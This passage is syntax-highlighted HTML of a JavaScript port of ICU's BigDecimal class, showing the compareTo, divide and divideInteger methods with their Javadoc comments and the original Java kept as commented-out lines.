&#123;</span><br><span class="line">         <span class="keyword">if</span> (ca&lt;cb)</span><br><span class="line">          &#123;<span class="comment">/* swap needed */</span></span><br><span class="line">           t=usel;</span><br><span class="line">           usel=user;</span><br><span class="line">           user=t; <span class="comment">// swap</span></span><br><span class="line">           tlen=usellen;</span><br><span class="line">           usellen=userlen;</span><br><span class="line">           userlen=tlen; <span class="comment">// ..</span></span><br><span class="line">           res.ind=-res.ind;</span><br><span class="line">          &#125;</span><br><span class="line">         <span class="keyword">break</span> compare;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">/* mantissas the same, so far */</span></span><br><span class="line">       ia++;</span><br><span class="line">       ib++;</span><br><span class="line">       &#125;</span><br><span class="line">      &#125;<span class="comment">/*compare*/</span></span><br><span class="line">     &#125; <span class="comment">// lengths the same</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(<span class="literal">false</span>);&#125;<span class="comment">/*swaptest*/</span></span><br><span class="line">   &#125;<span class="keyword">while</span>(<span class="literal">false</span>);&#125;<span class="comment">/*signdiff*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* here, A is &gt; B if subtracting */</span></span><br><span class="line">  <span class="comment">// add [A+B*1] or subtract [A+(B*-1)]</span></span><br><span class="line">  res.mant=<span class="keyword">this</span>.byteaddsub(usel,usellen,user,userlen,mult,<span class="literal">false</span>);</span><br><span class="line">  <span class="comment">// [reuse possible only after chop; accounting makes not worthwhile]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Finish() rounds before stripping leading 0's, then sets form, etc.</span></span><br><span class="line">  <span class="keyword">return</span> res.finish(set,<span class="literal">false</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Compares this &lt;code&gt;BigDecimal&lt;/code&gt; to another, using unlimited</span></span><br><span class="line"><span class="comment">  * precision.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #compareTo(BigDecimal, MathContext)&#125;,</span></span><br><span class="line"><span class="comment">  * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the comparison.</span></span><br><span class="line"><span class="comment">  * @return     An &lt;code&gt;int&lt;/code&gt; whose value is -1, 0, or 1 as</span></span><br><span class="line"><span class="comment">  *             &lt;code&gt;this&lt;/code&gt; is numerically less than, equal to,</span></span><br><span class="line"><span class="comment">  *             or greater than &lt;code&gt;rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @see    #compareTo(Object)</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public int compareTo(com.ibm.icu.math.BigDecimal rhs)&#123;</span></span><br><span class="line"> <span class="comment">//-- return this.compareTo(rhs,plainMC);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Compares this &lt;code&gt;BigDecimal&lt;/code&gt; to another.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Implements numeric comparison,</span></span><br><span class="line"><span class="comment">  * (as defined in the decimal documentation, see &#123;@link BigDecimal</span></span><br><span class="line"><span class="comment">  * class header&#125;),</span></span><br><span class="line"><span class="comment">  * and returns a result of type &lt;code&gt;int&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The result will be:</span></span><br><span class="line"><span class="comment">  * &lt;table cellpadding=2&gt;&lt;tr&gt;</span></span><br><span class="line"><span class="comment">  * &lt;td align=right&gt;&lt;b&gt;-1&lt;/b&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="comment">  * &lt;td&gt;if the current object is less than the first parameter&lt;/td&gt;</span></span><br><span class="line"><span class="comment">  * &lt;/tr&gt;&lt;tr&gt;</span></span><br><span class="line"><span class="comment">  * &lt;td align=right&gt;&lt;b&gt;0&lt;/b&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="comment">  * &lt;td&gt;if the current object is equal to the first parameter&lt;/td&gt;</span></span><br><span class="line"><span class="comment">  * &lt;/tr&gt;&lt;tr&gt;</span></span><br><span class="line"><span class="comment">  * &lt;td align=right&gt;&lt;b&gt;1&lt;/b&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="comment">  * &lt;td&gt;if the current object is greater than the first parameter.&lt;/td&gt;</span></span><br><span class="line"><span class="comment">  * &lt;/tr&gt;&lt;/table&gt;</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * A &#123;@link #compareTo(Object)&#125; method is also provided.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the comparison.</span></span><br><span class="line"><span class="comment">  * @param  set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings.</span></span><br><span class="line"><span class="comment">  * @return     An &lt;code&gt;int&lt;/code&gt; whose value is -1, 0, or 1 as</span></span><br><span class="line"><span class="comment">  *             &lt;code&gt;this&lt;/code&gt; is numerically less than, equal to,</span></span><br><span class="line"><span class="comment">  *             or greater than &lt;code&gt;rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @see    #compareTo(Object)</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//public int compareTo(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">compareTo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> set;</span><br><span class="line">  <span class="keyword">if</span> (compareTo.arguments.length == <span class="number">2</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = compareTo.arguments[<span class="number">1</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (compareTo.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = <span class="keyword">this</span>.plainMC;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"compareTo(): "</span> + compareTo.arguments.length + <span class="string">" arguments given; expected 1 or 2"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">var</span> rhs = compareTo.arguments[<span class="number">0</span>];</span><br><span class="line">  <span class="comment">//--int thislength=0;</span></span><br><span class="line">  <span class="keyword">var</span> thislength=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int i=0;</span></span><br><span class="line">  <span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal newrhs;</span></span><br><span class="line">  <span class="keyword">var</span> newrhs;</span><br><span class="line">  <span class="comment">// rhs=null will raise NullPointerException, as per Comparable interface</span></span><br><span class="line">  <span class="keyword">if</span> (set.lostDigits)</span><br><span class="line">   <span class="keyword">this</span>.checkdigits(rhs,set.digits);</span><br><span class="line">  <span class="comment">// [add will recheck in slowpath cases .. but would report -rhs]</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">this</span>.ind==rhs.ind)&amp;&amp;(<span class="keyword">this</span>.exp==rhs.exp))</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="comment">/* sign &amp; exponent the same [very common] */</span></span><br><span class="line">    thislength=<span class="keyword">this</span>.mant.length;</span><br><span class="line">    <span class="keyword">if</span> (thislength&lt;rhs.mant.length)</span><br><span class="line">     <span class="keyword">return</span> -<span class="keyword">this</span>.ind;</span><br><span class="line">    <span class="keyword">if</span> (thislength&gt;rhs.mant.length)</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">this</span>.ind;</span><br><span class="line">    <span class="comment">/* lengths are the same; we can do a straight mantissa compare</span></span><br><span class="line"><span class="comment">       unless maybe rounding [rounding is very unusual] */</span></span><br><span class="line">    <span class="keyword">if</span> ((thislength&lt;=set.digits)||(set.digits==<span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">      &#123;<span class="keyword">var</span> $<span class="number">6</span>=thislength;i=<span class="number">0</span>;i:<span class="keyword">for</span>(;$<span class="number">6</span>&gt;<span class="number">0</span>;$<span class="number">6</span>--,i++)&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">this</span>.mant[i]&lt;rhs.mant[i])</span><br><span class="line">        <span class="keyword">return</span> -<span class="keyword">this</span>.ind;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">this</span>.mant[i]&gt;rhs.mant[i])</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.ind;</span><br><span class="line">       &#125;</span><br><span class="line">      &#125;<span class="comment">/*i*/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// identical</span></span><br><span class="line">     &#125;</span><br><span class="line">   <span class="comment">/* drop through for full comparison */</span></span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="comment">/* More fastpaths possible */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.ind&lt;rhs.ind)</span><br><span class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.ind&gt;rhs.ind)</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="comment">/* carry out a subtract to make the comparison */</span></span><br><span class="line">  newrhs=<span class="keyword">this</span>.clone(rhs); <span class="comment">// safe copy</span></span><br><span class="line">  newrhs.ind=-newrhs.ind; <span class="comment">// prepare to subtract</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.add(newrhs,set).ind; <span class="comment">// add, and return sign of result</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #divide(BigDecimal, int)&#125;,</span></span><br><span class="line"><span class="comment">  * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * and the rounding mode is &#123;@link MathContext#ROUND_HALF_UP&#125;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * The length of the decimal part (the scale) of the result will be</span></span><br><span class="line"><span class="comment">  * the same as the scale of the current object, if the latter were</span></span><br><span class="line"><span class="comment">  * formatted without exponential notation.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the division.</span></span><br><span class="line"><span class="comment">  * @return     A plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *             &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal divide(com.ibm.icu.math.BigDecimal rhs)&#123;</span></span><br><span class="line"> <span class="comment">//-- return this.dodivide('D',rhs,plainMC,-1);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic and a</span></span><br><span class="line"><span class="comment">  * rounding mode.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #divide(BigDecimal, int, int)&#125;,</span></span><br><span class="line"><span class="comment">  * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * and the second parameter is &lt;code&gt;this.scale()&lt;/code&gt;, and</span></span><br><span class="line"><span class="comment">  * the third is &lt;code&gt;round&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The length of the decimal part (the scale) of the result will</span></span><br><span class="line"><span class="comment">  * therefore be the same as the scale of the current object, if the</span></span><br><span class="line"><span class="comment">  * latter were formatted without exponential notation.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * @param  rhs   The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *               the division.</span></span><br><span class="line"><span class="comment">  * @param  round The &lt;code&gt;int&lt;/code&gt; rounding mode to be used for</span></span><br><span class="line"><span class="comment">  *               the division (see the &#123;@link MathContext&#125; class).</span></span><br><span class="line"><span class="comment">  * @return       A plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *               &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic</span></span><br><span class="line"><span class="comment">  *               and the specified rounding mode.</span></span><br><span class="line"><span class="comment">  * @throws IllegalArgumentException if &lt;code&gt;round&lt;/code&gt; is not a</span></span><br><span class="line"><span class="comment">  *               valid rounding mode.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;round&lt;/code&gt; is &#123;@link</span></span><br><span class="line"><span class="comment">  *               MathContext#ROUND_UNNECESSARY&#125; and</span></span><br><span class="line"><span class="comment">  *               &lt;code&gt;this.scale()&lt;/code&gt; is insufficient to</span></span><br><span class="line"><span class="comment">  *               represent the result exactly.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal divide(com.ibm.icu.math.BigDecimal rhs,int round)&#123;</span></span><br><span class="line"> <span class="comment">//-- com.ibm.icu.math.MathContext set;</span></span><br><span class="line"> <span class="comment">//-- set=new com.ibm.icu.math.MathContext(0,com.ibm.icu.math.MathContext.PLAIN,false,round); // [checks round, too]</span></span><br><span class="line"> <span class="comment">//-- return this.dodivide('D',rhs,set,-1); // take scale from LHS</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic and a</span></span><br><span class="line"><span class="comment">  * given scale and rounding mode.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #divide(BigDecimal, MathContext)&#125;,</span></span><br><span class="line"><span class="comment">  * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;new MathContext(0, MathContext.PLAIN, false, round)&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * except that the length of the decimal part (the scale) to be used</span></span><br><span class="line"><span class="comment">  * for the result is explicit rather than being taken from</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The length of the decimal part (the scale) of the result will be</span></span><br><span class="line"><span class="comment">  * the same as the scale of the current object, if the latter were</span></span><br><span class="line"><span class="comment">  * formatted without exponential notation.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * @param  rhs   The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *               the division.</span></span><br><span class="line"><span class="comment">  * @param  scale The &lt;code&gt;int&lt;/code&gt; scale to be used for the result.</span></span><br><span class="line"><span class="comment">  * @param  round The &lt;code&gt;int&lt;/code&gt; rounding mode to be used for</span></span><br><span class="line"><span class="comment">  *               the division (see the &#123;@link MathContext&#125; class).</span></span><br><span class="line"><span class="comment">  * @return       A plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *               &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic</span></span><br><span class="line"><span class="comment">  *               and the specified rounding mode.</span></span><br><span class="line"><span class="comment">  * @throws IllegalArgumentException if &lt;code&gt;round&lt;/code&gt; is not a</span></span><br><span class="line"><span class="comment">  *               valid rounding mode.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;scale&lt;/code&gt; is negative.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;round&lt;/code&gt; is &#123;@link</span></span><br><span class="line"><span class="comment">  *               MathContext#ROUND_UNNECESSARY&#125; and &lt;code&gt;scale&lt;/code&gt;</span></span><br><span class="line"><span class="comment">  *               is insufficient to represent the result exactly.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal divide(com.ibm.icu.math.BigDecimal rhs,int scale,int round)&#123;</span></span><br><span class="line"> <span class="comment">//-- com.ibm.icu.math.MathContext set;</span></span><br><span class="line"> <span class="comment">//-- if (scale&lt;0)</span></span><br><span class="line"> <span class="comment">//--  throw new java.lang.ArithmeticException("Negative scale:"+" "+scale);</span></span><br><span class="line"> <span class="comment">//-- set=new com.ibm.icu.math.MathContext(0,com.ibm.icu.math.MathContext.PLAIN,false,round); // [checks round]</span></span><br><span class="line"> <span class="comment">//-- return this.dodivide('D',rhs,set,scale);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is &lt;code&gt;this/rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Implements the division (&lt;b&gt;&lt;code&gt;/&lt;/code&gt;&lt;/b&gt;) operator</span></span><br><span class="line"><span class="comment">  * (as defined in the decimal documentation, see &#123;@link BigDecimal</span></span><br><span class="line"><span class="comment">  * class header&#125;),</span></span><br><span class="line"><span class="comment">  * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the division.</span></span><br><span class="line"><span class="comment">  * @param  set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *             &lt;code&gt;this/rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal divide(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">divide</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> set;</span><br><span class="line">  <span class="keyword">var</span> scale = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> (divide.arguments.length == <span class="number">2</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> divide.arguments[<span class="number">1</span>] == <span class="string">'number'</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      set=<span class="keyword">new</span> MathContext(<span class="number">0</span>,MathContext.prototype.PLAIN,<span class="literal">false</span>,divide.arguments[<span class="number">1</span>]); <span class="comment">// [checks round, too]</span></span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">      set = divide.arguments[<span class="number">1</span>];</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (divide.arguments.length == <span class="number">3</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    scale = divide.arguments[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> (scale&lt;<span class="number">0</span>)</span><br><span class="line">     <span class="keyword">throw</span> <span class="string">"divide(): Negative scale: "</span>+scale;</span><br><span class="line">    set=<span class="keyword">new</span> MathContext(<span class="number">0</span>,MathContext.prototype.PLAIN,<span class="literal">false</span>,divide.arguments[<span class="number">2</span>]); <span class="comment">// [checks round]</span></span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (divide.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = <span class="keyword">this</span>.plainMC;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"divide(): "</span> + divide.arguments.length + <span class="string">" arguments given; expected between 1 and 3"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">var</span> rhs = divide.arguments[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.dodivide(<span class="string">'D'</span>,rhs,set,scale);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the integer</span></span><br><span class="line"><span class="comment">  * part of &lt;code&gt;this/rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #divideInteger(BigDecimal, MathContext)&#125;,</span></span><br><span class="line"><span class="comment">  * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the integer division.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the integer</span></span><br><span class="line"><span class="comment">  *             part of &lt;code&gt;this/rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal divideInteger(com.ibm.icu.math.BigDecimal rhs)&#123;</span></span><br><span class="line"> <span class="comment">//-- // scale 0 to drop .000 when plain</span></span><br><span class="line"> <span class="comment">//-- return this.dodivide('I',rhs,plainMC,0);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the integer</span></span><br><span class="line"><span class="comment">  * part of &lt;code&gt;this/rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Implements the integer division operator</span></span><br><span class="line"><span class="comment">  * (as defined in the decimal documentation, see &#123;@link BigDecimal</span></span><br><span class="line"><span class="comment">  * class header&#125;),</span></span><br><span class="line"><span class="comment">  * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the integer division.</span></span><br><span class="line"><span class="comment">  * @param  set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the integer</span></span><br><span class="line"><span class="comment">  *             part of &lt;code&gt;this/rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if the result will not fit in the</span></span><br><span class="line"><span class="comment">  *             number of digits specified for the context.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal divideInteger(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">divideInteger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> set;</span><br><span class="line">  <span class="keyword">if</span> (divideInteger.arguments.length == <span class="number">2</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = divideInteger.arguments[<span class="number">1</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (divideInteger.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = <span class="keyword">this</span>.plainMC;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"divideInteger(): "</span> + divideInteger.arguments.length + <span class="string">" arguments given; expected 1 or 2"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">var</span> rhs = divideInteger.arguments[<span class="number">0</span>];</span><br><span class="line">  <span class="comment">// scale 0 to drop .000 when plain</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.dodivide(<span class="string">'I'</span>,rhs,set,<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * the maximum of &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #max(BigDecimal, MathContext)&#125;,</span></span><br><span class="line"><span class="comment">  * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the comparison.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *             the maximum of &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal max(com.ibm.icu.math.BigDecimal rhs)&#123;</span></span><br><span class="line"> <span class="comment">//-- return this.max(rhs,plainMC);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * the maximum of &lt;code&gt;this&lt;/code&gt; and 